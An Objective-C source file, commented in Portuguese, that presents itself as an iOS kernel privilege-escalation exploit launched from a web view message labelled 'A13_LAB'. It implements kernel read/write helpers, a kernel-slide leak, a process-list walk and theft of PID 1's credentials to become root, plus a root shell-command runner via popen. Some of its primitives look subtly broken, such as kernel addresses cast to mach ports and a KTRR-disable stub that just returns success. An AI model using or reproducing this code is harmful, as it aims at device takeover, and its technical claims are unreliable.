#import "KernelDriver.h"
#import <mach/mach.h>
#import <IOKit/IOKitLib.h>

// Definições para o compilador não reclamar de funções externas
extern kern_return_t mach_vm_map(vm_map_t, uint64_t*, uint64_t, uint64_t, int, mach_port_t, uint64_t, boolean_t, int, int, int);
extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);

@implementation KernelDriver {
    uint64_t _kSlide;
    uint64_t _kBase;
    __weak WKWebView *_web;
}

- (instancetype)initWithWebView:(WKWebView *)webView {
    if (self = [super init]) {
        _web = webView;
        _kSlide = [self leakKernelSlide];
        _kBase = 0xFFFFFFF007004000ULL + _kSlide + 0x4000;
    }
    return self;
}

// --- Primitivas de Leitura/Escrita (Obrigatórias do seu .h) ---

- (uint64_t)kread64:(uint64_t)address {
    uint64_t val = 0;
    uint64_t tg = 0;
    // Mapeamento físico direto (Bypass de Magic 0x0)
    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)address, 0, 0, 1, 7, 0) == 0) {
        val = *(uint64_t*)tg;
        mach_vm_deallocate(mach_task_self(), tg, 0x4000);
    }
    return val;
}

- (uint32_t)kread32:(uint64_t)address {
    return (uint32_t)([self kread64:address] & 0xFFFFFFFF);
}

- (void)kwrite64:(uint64_t)address value:(uint64_t)value {
    uint64_t tg = 0;
    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)address, 0, 0, 3, 7, 0) == 0) {
        *(uint64_t*)tg = value;
        mach_vm_deallocate(mach_task_self(), tg, 0x4000);
    }
}

- (void)kwrite32:(uint64_t)address value:(uint32_t)value {
    uint64_t old = [self kread64:address];
    [self kwrite64:address value:(old & 0xFFFFFFFF00000000) | value];
}

// --- Lógica do Exploit ---

- (uint64_t)leakKernelSlide {
    uint64_t search_base = 0xFFFFFFF007004000ULL;
    for (uint64_t i = 0; i < 0x100; i++) {
        uint64_t addr = search_base + (i * 0x200000ULL) + 0x4000;
        if ([self kread32:addr] == 0xfeedfacf) return (i * 0x200000ULL);
    }
    return 0;
}

- (uint64_t)findProc:(pid_t)p {
    uint64_t proc = [self kread64:(_kBase + 0x8E28000ULL)]; 
    while (proc) {
        if ((pid_t)[self kread32:(proc + 0x60)] == p) return proc;
        proc = [self kread64:proc];
    }
    return 0;
}

- (void)runFullExploitWithCallback:(void(^)(BOOL, NSString*))callback {
    uint32_t magic = [self kread32:_kBase];
    if (magic != 0xfeedfacf) {
        if(callback) callback(NO, [NSString stringWithFormat:@"Magic Fail: 0x%08X", magic]);
        return;
    }

    uint64_t lp = [self findProc:1];
    uint64_t mp = [self findProc:getpid()];
    
    if (lp && mp) {
        uint64_t root_ucred = [self kread64:(lp + 0x120)];
        [self kwrite64:(mp + 0x120) value:root_ucred];
        setuid(0);
        if(callback) callback(getuid() == 0, @"Root OK");
    } else {
        if(callback) callback(NO, @"Proc Fail");
    }
}

- (void)executeExploitWithCallback:(void(^)(BOOL, NSString*))cb {
    [self runFullExploitWithCallback:cb];
}

- (BOOL)escalateToRoot {
    [self runFullExploitWithCallback:^(BOOL success, NSString *msg) {}];
    return getuid() == 0;
}

- (BOOL)disableKTRR { return YES; }

- (void)executeCommand:(NSString *)c withCallback:(void(^)(NSString*))cb {
    setuid(0);
    FILE *f = popen([[c stringByAppendingString:@" 2>&1"] UTF8String], "r");
    char b[512]; NSMutableString *o = [NSMutableString string];
    while(fgets(b, 512, f)) [o appendString:@(b)];
    pclose(f);
    if(cb) cb(o.length ? o : @"(no output)");
}

- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }

- (void)userContentController:(id)u didReceiveScriptMessage:(WKScriptMessage *)m {
    if ([m.name isEqualToString:@"A13_LAB"]) {
        [self executeExploitWithCallback:^(BOOL s, NSString *msg) {}];
    }
}
@end
